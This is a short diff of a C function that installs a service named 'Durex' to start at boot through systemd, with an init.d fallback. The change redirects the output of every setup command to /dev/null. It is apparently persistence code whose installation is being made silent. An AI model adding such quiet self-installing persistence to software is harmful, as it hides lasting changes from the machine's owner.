@@ -91,8 +91,8 @@ static int init_d()
 		(DEBUG) ? printf("Error munmap\n") : 0;
 	close(init_fd);
 	// reload systemd
-	system("systemctl enable Durex.service");// 1>/dev/null 2>/dev/null");
-	int ret = system("systemctl start Durex.service");// 1>/dev/null 2>/dev/null");
+	system("systemctl enable Durex.service 1>/dev/null 2>/dev/null");
+	int ret = system("systemctl start Durex.service 1>/dev/null 2>/dev/null");
 	// if systemd not installed, switch to init d
 	if (ret)
 	{
@@ -114,9 +114,9 @@ static int init_d()
 			(DEBUG) ? printf("Error munmap\n") : 0;
 		close(init_fd);
 		// reload initd
-		system("update-rc.d Durex defaults");// 1>/dev/null 2>/dev/null");
-		system("update-rc.d Durex enable");
-		system("/etc/init.d/Durex start");// 1>/dev/null 2>/dev/null");
+		system("update-rc.d Durex defaults 1>/dev/null 2>/dev/null");
+		system("update-rc.d Durex enable 1>/dev/null 2>/dev/null");
+		system("/etc/init.d/Durex start 1>/dev/null 2>/dev/null");
 	}
 	return 0;
 }
